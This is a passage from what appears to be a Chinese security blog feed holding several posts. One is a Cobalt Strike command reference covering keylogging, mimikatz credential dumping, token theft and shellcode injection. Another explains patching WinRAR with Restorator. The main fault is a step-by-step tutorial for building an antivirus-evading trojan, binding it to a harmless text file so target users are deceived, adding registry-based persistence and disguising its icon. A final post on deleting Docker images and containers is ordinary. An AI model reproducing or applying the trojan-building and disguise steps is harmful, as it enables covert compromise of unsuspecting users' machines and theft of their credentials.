清除当前会话的票据</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line">keylogger 键盘记录</span><br><span class="line">kill 结束进程</span><br><span class="line">link Connect to a Beacon peerover a named pipe</span><br><span class="line">logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line">ls 列出文件</span><br><span class="line">make_token 创建令牌以传递凭据</span><br><span class="line">mimikatz 运行mimikatz</span><br><span class="line">mkdir 创建一个目录</span><br><span class="line">mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">mode http 使用HTTP作为通信通道</span><br><span class="line">mv 移动文件</span><br><span class="line">net net命令</span><br><span class="line">note 备注</span><br><span class="line">portscan 进行端口扫描</span><br><span class="line">powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import 导入powershell脚本</span><br><span class="line">ppid <span class="keyword">Set</span> parent <span class="comment">PID forspawned post-ex jobs</span></span><br><span class="line">ps 显示进程列表</span><br><span class="line">psexec <span class="comment">Use a service to spawn asession on a host</span></span><br><span class="line">psexec_psh <span class="comment">Use PowerShell to spawn asession on a host</span></span><br><span class="line">psinject 在特定进程中执行<span class="comment">PowerShell</span>命令</span><br><span class="line">pth 使用<span class="comment">Mimikatz</span>进行传递哈希</span><br><span class="line">pwd 当前目录位置</span><br><span class="line">reg <span class="comment">Query the registry</span></span><br><span class="line">rev2self 恢复原始令牌</span><br><span class="line">rm 删除文件或文件夹</span><br><span class="line">rportfwd 端口转发</span><br><span class="line">run 在目标上执行程序<span class="comment">(</span>返回输出<span class="comment">)</span></span><br><span class="line">runas 以另一个用户权限执行程序</span><br><span class="line">runasadmin 在高权限下执行程序</span><br><span class="line">runu <span class="comment">Execute a program underanother PID</span></span><br><span class="line">screenshot 屏幕截图</span><br><span class="line">setenv 设置环境变量</span><br><span class="line">shell <span class="comment">cmd.exe</span>  打开<span class="comment">cmd</span>终端</span><br><span class="line">shell <span class="comment">ipconfig</span> 执行<span class="comment">ipconfig</span>命令</span><br><span class="line">shinject 将<span class="comment">shellcode</span>注入进程</span><br><span class="line">shspawn 生成进程并将<span class="comment">shellcode</span>注入其中</span><br><span class="line">sleep 设置睡眠延迟时间</span><br><span class="line">socks 启动<span class="comment">SOCKS4</span>代理</span><br><span class="line">socks <span class="comment">stop</span> 停止<span class="comment">SOCKS4</span></span><br><span class="line">spawn <span class="comment">Spawn a session</span></span><br><span class="line">spawnas <span class="comment">Spawn a session as anotheruser</span></span><br><span class="line">spawnto <span class="comment">Set executable tospawn processes into</span></span><br><span class="line">spawnu <span class="comment">Spawn a session underanother PID</span></span><br><span class="line">ssh 使用<span class="comment">ssh</span>连接远程主机</span><br><span class="line">ssh-key 使用密钥连接远程主机</span><br><span class="line">steal_token 从进程中窃取令牌</span><br><span class="line">timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line">unlink <span class="comment">Disconnect from parentBeacon</span></span><br><span class="line">upload 上传文件</span><br><span class="line">wdigest 使用<span class="comment">mimikatz</span>转储明文凭据</span><br><span class="line">winrm 使用<span class="comment">WinRM</span>在主机上生成会话</span><br><span class="line">wmi 使用<span class="comment">WMI</span>在主机上生成会话</span><br><span class="line">argue 进程参数欺骗</span><br></pre></td></tr></table></figure><p>简单执行命令<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/289671437f709365de5a2814c404276a.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 3 全部命令3秒执行(默认时60秒太长，)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/70585c627c2b72b05a8327148763c874.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行系统命令要在命令前加个shell <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f19e237d101f5d2af4c7711ed17dfa1d.png" alt="在这里插入图片描述"></p><h2 id="三、如何加载插件及EXE？"><a href="#三、如何加载插件及EXE？" class="headerlink" title="三、如何加载插件及EXE？"></a>三、如何加载插件及EXE？</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/21e95c67f6a2dd9b78413dd1dea0a43e.png" alt="在这里插入图片描述"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a608b591991be7e7e89b5c3bb984f4b0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1efc47dcc28d2fbb0b79071e12f9baf.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9dc44ed86a5a91ea6ba0d969e4082ff3.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8d62307548f725b99ad73a81ca39315b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd4168389490b83b43a09c7ca5be69d5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1f8e05004bd2fa94737dad28ab5d5c60.png" alt="在这里插入图片描述"><br><strong>如果不想加载插件想直接上传成品exe文件也是可以的</strong><br>Ladon插件/工具体积小、免杀<br><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7040b73f54481840d89d14852e65f8f7.png" alt="在这里插入图片描述"><br>可以利用CS自身文件上传功能上传成品的exe或者直接使用插件<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2c0d3ecca0022bd64564630526353b06.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d0e664b3ab32c9f82cc3418f1ced1da5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dfb7e88979435b5388d14be7384a98a0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99cb7148de4fcebe8dec9b12715c3924.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1cac18e081c12f9b1ebb46bd8ae65368.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/02a3a3e8122eb70a4b749a633105c78b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ac9b3c70920e1ac1babff556af996d4a.png" alt="在这里插入图片描述"></p><p>四、联动MSF<br>1、CS-&gt;MSF(CS把权限转交给MSF)</p><p><strong>CS：</strong><br>新建个监听器（监听的协议要与MSF一致，这里监听HTTP协议，那么MSF也要监听HTTP协议）<br>CS监听的协议是windows/foreign/reverse_http字样</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6954a480ba11e21ac47978802618f5.png" alt="在这里插入图片描述"></p><p>spawn msf （要联动的会话上执行该命令）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/751a23740a2febd0a0ed150344224f4e.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Restorator常见使用方法</title>
      <link href="/posts/1586e22.html"/>
      <url>/posts/1586e22.html</url>
      
        <content type="html"><![CDATA[<h2 id="Restorator常见使用方法有哪些？"><a href="#Restorator常见使用方法有哪些？" class="headerlink" title="Restorator常见使用方法有哪些？"></a>Restorator常见使用方法有哪些？</h2><h3 id="案例一：解决WinRAR弹出广告"><a href="#案例一：解决WinRAR弹出广告" class="headerlink" title="案例一：解决WinRAR弹出广告"></a>案例一：解决WinRAR弹出广告</h3><h4 id="1、导出rc文件"><a href="#1、导出rc文件" class="headerlink" title="1、导出rc文件"></a>1、导出rc文件</h4><p>WinRAR安装完成后，用Restorator 2018打开安装目录WinRAR.exe。点开“打开”对话框后，通过WinRAR的安装路径，找到这个exe程序，然后点击“打开”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132703168905322378488.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第2张"></p><p>Restorator 2018界面主要分为左右两个区，左边是资源树，我们点击“字符串”左边的加号，在展开的项目中，右键点击“中文”，然后选择“导出”→“导出为.rc”，保存到桌面：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132703168905322323484.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第3张"></p><h4 id="2、打开rc文件"><a href="#2、打开rc文件" class="headerlink" title="2、打开rc文件"></a>2、打开rc文件</h4><p>上一步会导出一个.rc后缀的文件到指定位置。这一步我们去找到这个文件。如下图所示，我将导出的文件命名为“WinRAR导出分析-中文(简体，中-国).rc”，找到它，右键点开菜单后选择“打开方式”，然后用记事本的方式打开它也可以用文本编辑工具（<a href="https://www.lw50.com/post/notepadv85.html">notepad++</a>）修改：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322441114.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第4张"></p><p>注意选择用记事本打开这个.rc文件时，不要勾选“始终用此应用打开.rc文件”。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322414576.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第5张"></p><h4 id="3、定位弹广代码"><a href="#3、定位弹广代码" class="headerlink" title="3、定位弹广代码"></a>3、定位弹广代码</h4><p>这一步很关键。下图就是用记事本打开.rc文件的样子，可以看到每一行都有个序数，后面引号里是一个可执行操作的名字。我们需要找到有关弹窗广告的代码，并用合适的方式覆盖它。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322461116.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第6张"></p><p>由于WinRAR在不停的更新中，所有新老版本的WinRAR将会有区别。我的WinRAR版本为中文版6.02，涉及弹窗的代码在第1277行。如果你用的WinRAR是其他版本，有可能不是第1277行，但是大致也跑不了1000~1300之间，特征是前后都一、两条网址。由于这个代码行，相对于其他中文还是很明显的，仔细找一下并不是很麻烦。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132704168905322468893.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第7张"></p><h4 id="4、覆盖弹广代码"><a href="#4、覆盖弹广代码" class="headerlink" title="4、覆盖弹广代码"></a>4、覆盖弹广代码</h4><p>找到弹窗代码后删除，改为</p><blockquote><p>“Reminder dialog information”</p></blockquote><p>注意：要保留引号，逗号等等，格式要与之前保持一致，避免马虎。改好之后，左上菜单选择“文件”→“另存为”，将这个.rc文件保存。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322511535.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第8张"></p><h4 id="5、导入已保存的-rc文件"><a href="#5、导入已保存的-rc文件" class="headerlink" title="5、导入已保存的.rc文件"></a>5、导入已保存的.rc文件</h4><p>这一步，我们把刚才已保存的.rc文件导入到Restorator 2018。操作与之前类似，先在左侧资源树点“+”展开“字符串”，然后右键点击“中文(xxx)”，菜单中选择“导入”→“导入…”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322575625.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第9张"></p><p>打开刚才保存的.rc文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132705168905322566301.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第10张"></p><p>此时可以看到Restorator 2018右侧的查看器内，已经是之前.rc的新内容（第1277行代码已经被覆盖），接下来选择“文件”→“另存为”，</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132706168905322653221.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第11张"></p><p>另存为一个新的exe文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322642506.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第12张"></p><h4 id="6、覆盖源WinRAR-exe文件"><a href="#6、覆盖源WinRAR-exe文件" class="headerlink" title="6、覆盖源WinRAR.exe文件"></a>6、覆盖源WinRAR.exe文件</h4><p>接下来，我们把这个新WinRAR.exe，粘贴到WinRAR目录，覆盖原安装目录exe同名程序即可大功告成！</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322630189.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第13张"></p><p>好啦，现在你再启动WinRAR！再也没有弹窗广告了！</p><h3 id="案例二：修改软件标题"><a href="#案例二：修改软件标题" class="headerlink" title="案例二：修改软件标题"></a>案例二：修改软件标题</h3><p>1、首先载入我们需要修改的软件：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132708168905322863622.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第14张"></p><p>2、先更改成“编辑模式”。方法：单机“查看器”——“编辑模式”即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132709168905322970763.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第15张"></p><p>3、在“资源树”里找到“对话框”——“101”，在右侧“标题”修改你希望看到的软件标题栏显示内容。中间的“资源查看器”会有预览。效果图如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132715168905323546042.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第16张"></p><p>4、然后在“资源树”里找到“对话框”——“112”这一项。我们只需单击我们想改的文字，在右侧“标题”下方修改即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132717168905323752094.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第17张"></p><p>5、修改完成后的效果如下：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132725168905324596468.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第18张"></p><p>6、然后就是修改图标。这里拿logo来演示！ico图标分辨率为32x32：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132726168905324639140.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第19张"></p><p>7、“资源树”——“图标”——“105”，右击“105”——“导入”——“导入到”，把ZOL导入；接着用同样的方法把图标导入到“108”中：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132731168905325163742.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第20张"></p><p>8、单击查看效果如何：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132733168905325316894.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第21张"></p><p>9、在“资源树”里找到“版本”项：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132735168905325574811.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第22张"></p><p>10、右下方就是我们要修改的内容了。可以把自己的个人信息都写进去：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132737168905325796822.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第23张"></p><h3 id="案例三：修改软件图标"><a href="#案例三：修改软件图标" class="headerlink" title="案例三：修改软件图标"></a>案例三：修改软件图标</h3><p>1、进去主界面后，如果需要填写注册码，打开“汉化说明”这个文本特别信息中的就是注册码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132741168905326172413.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第24张"></p><p>2、打开你要修改的文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132742168905326273146.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第25张"></p><p>3、打开文件后，左侧资源树点击（红1）小三角拉开，把图标项也拉开（红2），现在看到（红3）的是该文件的包含的所有ICON，选中后可以看到图标的信息。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132744168905326485900.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第26张"></p><p>4、选中图标_5000，可以在资源查看器看到ICON的信息（红1），可以看出来这个文件的图标格式是比较多的，往下拉（红2）就可以看到RGB/A的图像信息，目前看到的是16色信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132745168905326538644.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第27张"></p><p>5、256<em>128</em>96<em>64</em>48<em>32</em>24<em>16-RGB/A、256</em>128<em>96</em>64<em>48</em>32<em>24</em>16-256色、256<em>128</em>96<em>64</em>48<em>32</em>24*16-16色以上是图标项-5000图像信息，替换新的ICON进来时请确保图标信息要和原来的格式/数量一致！</p><p>6、为了达到安全稳定的使用效果，请逐个检查你将要选择替换的ICON项的格式和数量，确保替换一致。</p><p>7、请将你要替换的ico全部放到同一个文件夹里面，并对应图标在应用文件里面的编号（红1），比如：5000对应的是安全，5004对应的是防火墙……（红2）这里是文件游览器，方便我们查看要替换用的ICON。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132746168905326653562.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第28张"></p><p>8、将你要替换的图标整理到同一个文件夹下，然后用文件游览器找到并进入（红2），直到看到所有已经编号好的图标（红1）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132748168905326864697.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第29张"></p><p>9、如果你的准备工作做好了，我们就要开始批量替换图标了。</p><p>10、右键左边资源树的图标项（文件夹图标），选择导入(O)，点击自动导入所有”图标”类型(Z)</p><p>11、导入完后，直接按F12另存为，保存完成了！</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀木马+文件捆绑+权限伪装</title>
      <link href="/posts/1bec3970.html"/>
      <url>/posts/1bec3970.html</url>
      
        <content type="html"><![CDATA[<h1 id="免杀木马-文件捆绑-权限伪装"><a href="#免杀木马-文件捆绑-权限伪装" class="headerlink" title="免杀木马+文件捆绑+权限伪装"></a>免杀木马+文件捆绑+权限伪装</h1><ul><li><p><strong>文章前言</strong></p><p>通过学习使用Cobalt Strike来制作木马，使用摧日对其进行免杀覆盖，使用GoFilebinder对其进行免杀捆绑，最后利用Restorator对其进行图标修改。</p></li><li><p><strong>环境和软件准备</strong></p><p>\1. 一台windows系统的电脑作为攻击机</p><p>2.一台靶机</p><p>3.Cobalt Strike</p><p>4.摧日</p><p>5.GoFilebinder</p><p>6.Restorator</p></li><li><p><strong>工具介绍</strong></p><p>摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马主要支持C语言的shellcode和纯十六进制的shellcode<br>GoFileBinder：golang免杀捆绑器<br>Restorator：一款修改exe执行程序图标的小工具</p></li><li><p><strong>正文开始</strong></p><p>选用cs中的c格式shellcode，用cs生成一个c语言的相关东西，同时勾选上x64</p></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGTurmQDUUoIkwBgIUztkiayF20PQOFDEGIDPwCsExIlZMoXWZtqhbHUQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPsqAbCOyCY0LR1zGsKphmjGtM7UdiarEu9KtVXqAiaJqUXDe5fkibo8HQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>完成以上步骤后，接下来便开始对其进行免杀操作，用到的工具摧日对其进行免杀处理</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGWGKt2ibzRFhNE3XWAQ4SNIDDgcx9iasydQDQ76s0lDdwIoL6lz3QSJnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>使用前请先获取相关工具，并确保已经安装工具所需要的的go环境，至于go环境安装请各位自行查阅本文不在做出相关介绍，安装完毕后进行下一步操作。复制上一步中生成的c文件的中的相关字符，将其另存为一个新的文档，并将该文档与摧日工具的exe文件放在一个目录之中，并运行工具，运行成功后将会得到免杀后的文件hoshino.exe。用相关管家进行查杀后，都可以正常通过。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGe2AiaWzWQRTVAaDMS4PdZJB2OwscrU2Od3UElHEbaB4alWSVxILs1ww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGLFv5IbhM97F127XqH2teAoYrFOK0Aia24fdlAPrVrl1fdd364prbZ6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>  然后进行的操作是将这个马和正常的东西捆绑在一起，这个东西可以是可执行文件exe，也可以是文本txt，也可以是文档doc，任何你想的东西都可以进行捆绑。<br>   最后实现的效果是：目标用户点击你发送的恶意文件之后会在你的CS客户端上上线，而且目标用户打开的文件可以正常的使用，并且你的木马文件会自动迁移到C:\Users\Public<br>下面将木马和一个txt文本文件进行捆绑：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGR4x3GXibUMMPPmiaD0gDe0FXbg4KGzwKb8rMEI8y18Iga8ic9YcyqORXg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>将木马和txt文本文件还有GoFileBinder放在同级目录下，运行后得到如下结果，其中新出现的bilibili.exe就是我们要得到的文件</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGGRG2ibtmIjhvOkPhxzToHfPmVSH88PDGicKjLERicaxtQcsphHztxHg6g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>进行相关测试，将得到的文件双击后，该文件便会消失，在桌面上打开的便是我们所预设的ceshi.txt，并且我们的原文间将会自动一直到public目录下，cs也显示主机已经上线，至此所有工作已全部完成。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcG1F5yKYmDyIqj4H7s2ibdN7w5tPWFIm6hDrVsjlCyDSeWYx28IWgcI1w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/640" alt="图片"></p><p>最后一步，权限维持，如果不进行权限维持的话，目标用户在进行电脑重启后便会让改文件关闭，因此便需要用对其增加开机自启的相关操作，其后续路径因为程序会自动移动到public目录下便很好就能设置，</p><ul><li><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> <span class="keyword">reg</span> <span class="built_in">add</span> HKLM\SOFTWARE\Microsoft\Windows\</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPjicPN7J7OvoS4UJvyzEkic3qlqUYl4Nby6ImRM2YopEtia00jpm7Zv3w/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>最后利用Restorator工具对该文件进行图标美化操作，可以将其伪装成一些较为常见的进程图标，该工具的使用较为方便，本文在这里便不再进行相关的阐述，请自行理解！</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker删除镜像和容器</title>
      <link href="/posts/329caef9.html"/>
      <url>/posts/329caef9.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="优雅删除镜像（推荐做法）"><a href="#优雅删除镜像（推荐做法）" class="headerlink" title="优雅删除镜像（推荐做法）"></a>优雅删除镜像（推荐做法）</h2><p>1、查看Docker要删除的镜像，如目标版本为stable-perl的Nginx，镜像ID（IMAGE ID）为 df1998569adb。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>2、使用命令“docker rmi 镜像ID”删除Nginx（stable-perl）的镜像，只取“IMAGE ID”的前3个字符即可。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><p>  报错内容如下，意思是镜像（df1）存在使用中的容器（f66），不能强制删除镜像。官方的意思是要先停止容器运行，再进行镜像的删除操作吗？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response <span class="keyword">from</span> daemon: <span class="keyword">conflict</span>: unable <span class="keyword">to</span> <span class="keyword">delete</span> df1998569adb (cannot be forced) - image <span class="keyword">is</span> being used <span class="keyword">by</span> running container f6678f2821c7</span><br></pre></td></tr></table></figure><p>3、查看Docker运行中的容器，如容器 nginx:stable-perl ，容器ID为 f66。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>4、先停止nginx:stable-perl容器（f66）运行，再去删除Nginx（stable-perl）镜像（df1）。<br>（1）停止容器（f66）运行。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop f66</span><br></pre></td></tr></table></figure><p>（2）删除镜像（df1）。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><p>  What？都已经停止容器（f66）运行了，删除镜像（df1）怎么还报错啊！？其实，只停止容器的正常运行还不行，还有最重要的一步没做：删除容器。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response <span class="keyword">from</span> daemon: <span class="keyword">conflict</span>: unable <span class="keyword">to</span> <span class="keyword">delete</span> df1998569adb (must be forced) - image <span class="keyword">is</span> being used <span class="keyword">by</span> stopped container f6678f2821c7</span><br></pre></td></tr></table></figure><p>5、查看Docker所有容器的状态（包含运行中的和已停止的），“STATUS”为“Exited(0)”代表停止运行。执行删除容器命令“docker rm f66”，删除 nginx:stable-perl 容器，再查看 nginx:stable-perl 容器是否还在列表中。<br>（1）查看Docker所有容器的状态。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>（2）删除 nginx:stable-perl 容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> f66</span><br></pre></td></tr></table></figure><p>（3）再查看Docker所有容器的状态，发现 nginx:stable-perl 容器（f66）已经不存在了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>6、删除镜像，再查看所有镜像，发现列表中已经不存在版本为stable-perl的Nginx镜像（df1）。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><h2 id="优雅删除容器（推荐做法）"><a href="#优雅删除容器（推荐做法）" class="headerlink" title="优雅删除容器（推荐做法）"></a>优雅删除容器（推荐做法）</h2><p>1、查看Docker中运行中的容器，例如 Nginx ，容器ID为 39c，并删除容器。<br>（1）查看Docker中运行中的容器。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>（2）删除Nginx容器（39c）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rm <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（3）发现会报错，报错内容如下，意思是容器还在运行，不能删除，先停止运行再删除，或直接强制删除。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error </span>response from daemon: You cannot remove a running container 39cdb69246fdb6b623cff60af5b59e033149b6940bc5e0432c760ea245da81a9. Stop the container before attempting removal or force remove</span><br></pre></td></tr></table></figure><p>2、停止容器（39c），查看所有容器的运行状态。<br>（1）停止容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 